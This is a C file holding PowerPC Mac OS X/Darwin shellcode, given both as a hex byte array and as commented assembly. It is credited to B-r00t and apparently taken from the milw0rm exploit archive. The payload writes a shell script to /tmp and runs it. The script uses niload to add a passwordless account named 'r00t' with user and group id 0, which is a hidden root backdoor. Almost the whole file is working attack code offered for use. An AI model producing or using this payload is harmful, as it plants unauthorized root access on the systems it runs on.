/*
PPC OS X / Darwin Shellcode by B-r00t. 2003.
open(); write(); close(); execve(); exit();
See ASM below.
219 Bytes!
*/

char shellcode[] =
"\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x48\x02\xa6\x3b\xea\x01\x70"
"\x39\x60\x01\x70\x39\x1f\xff\x0d\x7c\xa8\x29\xae\x38\x7f\xff\x04"
"\x38\x80\x02\x01\x38\xa0\xff\xff\x38\x0b\xfe\x95\x44\xff\xff\x02"
"\x60\x60\x60\x60\x38\x9f\xff\x0e\x38\xab\xfe\xe5\x38\x0b\xfe\x94"
"\x44\xff\xff\x02\x60\x60\x60\x60\x38\x0b\xfe\x96\x44\xff\xff\x02"
"\x60\x60\x60\x60\x7c\xa5\x2a\x79\x38\x7f\xff\x04\x90\x61\xff\xf8"
"\x90\xa1\xff\xfc\x38\x81\xff\xf8\x38\x0b\xfe\xcb\x44\xff\xff\x02"
"\x60\x60\x60\x60\x38\x0b\xfe\x91\x44\xff\xff\x02\x2f\x74\x6d\x70"
"\x2f\x78\x2e\x73\x68\x58\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68\x0a"
"\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x20\x27\x72\x30\x30\x74\x3a"
"\x3a\x39\x39\x39\x3a\x38\x30\x3a\x3a\x30\x3a\x30\x3a\x72\x30\x30"
"\x74\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x27\x20\x7c\x20\x2f"
"\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6e\x69\x6c\x6f\x61\x64\x20\x2d"
"\x6d\x20\x70\x61\x73\x73\x77\x64\x20\x2e\x0a";

int main (void)
{
        __asm__("b _shellcode");
}


/*
; PPC OS X / Darwin Shellcode by B-r00t.
; open(); write(); close(); execve(); exit()
; Adds a user account (admin member) using a
; '/tmp/x.sh shellscript (niload).
; echo 'r00t::999:80::0:0:r00t:/:/bin/sh' | /usr/bin/niload -m passwd .
;
.globl _main
.text
_main:
        xor.    r5, r5, r5
        bnel    _main
        mflr    r10
	addi	r31, r10, 368
	li	r11, 368
        addi    r8, r31, -243
        stbx    r5, r8, r5
        addi    r3, r31, -252
        li      r4, 513
        li      r5, -1
        addi    r0,  r11, -363
        .long   0x44ffff02
        .long   0x60606060
        addi    r4, r31, -242
        addi    r5, r11, -283
        addi    r0, r11, -364
        .long   0x44ffff02
        .long   0x60606060
        addi    r0, r11, -362
        .long   0x44ffff02
        .long   0x60606060
        xor.    r5, r5, r5
        addi    r3, r31, -252
        stw     r3, -8(r1)
        stw     r5, -4(r1)
        subi    r4, r1, 8
        addi    r0, r11, -309
        .long   0x44ffff02
        .long   0x60606060
        addi    r0, r11, -367
        .long   0x44ffff02
path:   .asciz  "/tmp/x.shX#!/bin/sh\n/bin/echo 'r00t::999:80::0:0:r00t:/:/bin/sh' | /usr/bin/niload -m passwd .\n"
*/

// milw0rm.com [2004-09-26]